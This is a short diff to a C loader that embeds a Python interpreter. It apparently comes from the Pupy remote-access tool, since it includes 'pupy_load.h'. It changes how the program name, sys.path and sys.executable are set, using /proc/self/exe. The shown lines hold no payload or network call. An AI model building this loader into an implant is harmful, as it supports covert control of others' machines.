@@ -11,6 +11,7 @@
 #include <string.h>
 #include <pthread.h>
 #include <stdint.h>
+#include <unistd.h>
 #include <sys/mman.h>
 #include <sys/resource.h>
 #include "pupy_load.h"
@@ -96,6 +97,8 @@ uint32_t mainThread(int argc, char *argv[], bool so) {
 	PyEval_InitThreads();
 	dprint("PyEval_InitThreads() called\n");
 
+	char exe[PATH_MAX] = {};
+
 	if(!Py_IsInitialized()) {
 		dprint("Py_IsInitialized\n");
 
@@ -103,7 +106,10 @@ uint32_t mainThread(int argc, char *argv[], bool so) {
 		Py_NoSiteFlag = 1; /* remove site.py auto import */
 
 		dprint("INVOCATION NAME: %s\n", program_invocation_name);
-		Py_SetProgramName(program_invocation_name);
+
+		if (readlink("/proc/self/exe", exe, sizeof(exe)) > 0) {
+			Py_SetProgramName(exe);
+		}
 
 		dprint("Initializing python.. (%p)\n", Py_Initialize);
 		Py_InitializeEx(0);
@@ -122,11 +128,11 @@ uint32_t mainThread(int argc, char *argv[], bool so) {
 			}
 		}
 
-		PySys_SetPath(".");
+		PySys_SetPath("");
 #ifndef DEBUG
 		PySys_SetObject("frozen", PyBool_FromLong(1));
 #endif
-
+		PySys_SetObject("executable", PyString_FromString(exe));
 		dprint("Py_Initialize() complete\n");
 	}
 	restore_state=PyGILState_Ensure();
